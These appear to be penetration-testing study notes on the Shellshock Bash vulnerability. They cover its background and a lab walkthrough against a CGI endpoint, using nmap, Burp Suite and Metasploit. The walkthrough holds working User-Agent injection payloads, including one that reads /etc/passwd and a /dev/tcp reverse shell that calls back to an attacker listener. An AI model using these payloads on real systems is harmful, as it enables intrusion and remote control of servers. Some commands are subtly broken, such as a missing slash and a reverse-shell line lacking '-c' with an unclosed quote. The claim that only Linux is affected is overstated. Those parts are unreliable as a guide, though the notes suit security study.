- Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allows an attacker to execute remote arbitrary commands via Bash, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.
- The Shellshock vulnerability was discovered by Stephane Chazelas on the 12th of September 2014 and was made public on the 24th of September 2014.
- Bash is a \*Nix shell that is a part of the GNU project and is the default shell for most Linux distributions.
- The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters: `() { :; };`
- This vulnerability only affects Linux as Windows does not utilize Bash as it is not a \*Nix based operating system.
- In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
- CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.

Exploitation
- In order to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash.
- In the context of an Apache web sever, we can utilize any legitimate CGI scripts accessible on the web server.
- Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash.
- This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.
- The most effective method to exploit the shellshock vulnerability is to inject the characters in the user-agent HTTP header, and then specify the other commands that we would like to execute after those characters.
- Manual exploitation can be performed using a proxy tool, like Burp Suite, ZAP or Caido.

Practical Demonstration
- `ifconfig`
- `nmap -sV 10.10.10.3`
- The Nmap scan performed by us was to determine if there is an Apache web server being hosted on the target device.
- Our next step will be to manually verify that the web server is being hosted on the specified port, using a web browser.
- There is a timer available on the web page, which is not being rendered client-side, we can check the page source to verify that there is a publicly accessible CGI script, being stored at the root of the server, `10.10.10.3/gettime.cgi`, which is being executed to display the timer.
- The CGI script is passing commands to Bash to reflect the remaining time on the timer, and as such can be utilized as an input vector.
- We can check if the target system is vulnerable to the Shellshock vulnerability using a Nmap script called "http-shellshock".
- `nmap 10.10.10.3 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`
- The script argument "http-shellshock.uri" here is used to specify the endpoint to check for the vulnerability's presence.
- Manual Exploitation using Burp Suite
	- Exploitation here will be performed using Burp Suite, in which we can first intercept the request using the Interceptor module, with either the web browser provided by Burp Suite, or by setting up a proxy for our browser using FoxyProxy.
	- Once we have intercepted the request made by the browser to the `http://10.10.10.3/gettime.cgi` endpoint, we can send the request to the Repeater module.
	- In the Repeater module, we can remove the parameter present for the User-Agent request field, and replace it with the characters present in the vulnerability's payload, followed by the command we want to execute:
		- `() { :; }; echo; echo; /bin/bash -c 'cat etc/passwd'`
	- We can then send the request to the target server, and inspect the response to verify that the command we intended to execute has been executed.
	- Attempting to get a reverse shell to the target system:
		- First of all, we will set up a listener on our attacker machine using netcat.
			- `nc -nvlp 1234`
		- Then we will edit the parameter we set in the User-Agent request field, to execute an interactive bash shell and redirect its output to the attacker machine, the IP address we specify in the command here would be our LHOST's IP address. 
			- `() { :; }; echo; echo; /bin/bash - 'bash -i>&/dev/tcp/10.10.10.2/1234 0>&1`
		- Now, we have a reverse shell on the machine, present on our netcat listener.
- Automated Exploitation using Metasploit Framework
	- `service postgresql start && msfconsole`
	- `search shellshock`
	- `use auxiliary/scanner/http/apache_mod_cgi_bash_env`
	- `use exploit/multi/http/apache_mod_cgi_bash_env_exec`
	- `options`
	- `set RHOSTS 10.10.10.3`
	- `set TARGETURI /gettime.cgi`
	- `exploit`
	- Meterpreter Session
		- `sysinfo`